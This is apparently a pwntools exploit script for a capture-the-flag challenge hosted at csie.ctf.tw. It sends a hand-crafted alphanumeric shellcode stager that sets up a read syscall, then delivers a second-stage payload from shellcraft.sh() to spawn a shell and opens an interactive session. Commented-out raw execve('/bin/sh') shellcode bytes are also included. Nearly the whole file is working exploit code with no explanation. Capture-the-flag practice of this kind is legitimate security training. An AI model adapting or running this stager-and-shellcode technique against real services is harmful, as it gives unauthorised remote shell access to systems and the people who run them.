from pwn import *

#r = remote('127.0.0.1',8888)
r = remote('csie.ctf.tw',10137)

raw_input('pause')

s1 = 'PY5CnO2P' # eax = 14
s2 = '5CoO2P' # ecx = MoO2
s3 = '5MnO2' #  
s4 = 'H4F49PH4F49P' # edx = 128, al = 0, ebx = 0        '20' --> 0xcd 0x80
s5 = 'H4O41410Ac' # xor ecx + 99           '0' xor 0xff xor 'O'
s6 = 'I4O41410Ac' # al(0xff) xor ecx + 98  '2' xor 0xff
s7 = 'PUVW' # push 4 things
s8 = 'Na' #popa

s = s1 + s2 + s3 + s4 + s5 + s6 + s7 + s8 + 'H' * 11
pad = 'N'*(98 - len(s))
back = '20' + 'N' * (256 - 90)

print 98 - len(s)
#GGGs = 'PYH49PP' # ecx = 0x324f6e4d
#    'HH5MnO2HHHP48' # eax = 3
#    'PPUVWNaKKKHH5MnO2HHH48'
#l = len(s)
#pad = 'P' * (40 - l)
r.send(s + pad + back + '\n')

#shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
#shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
shellcode = asm(shellcraft.sh())


r.send(shellcode + 'P'*10 + p32(0)*30 + '\n')

r.interactive()
